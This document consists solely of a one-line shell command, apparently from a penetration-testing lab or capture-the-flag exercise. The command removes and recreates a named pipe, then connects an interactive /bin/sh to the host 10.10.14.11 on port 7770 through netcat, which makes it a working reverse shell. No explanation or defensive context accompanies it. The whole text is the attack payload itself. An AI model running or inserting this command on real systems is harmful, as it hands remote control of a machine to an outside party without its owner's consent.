rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 7770 > /tmp/f
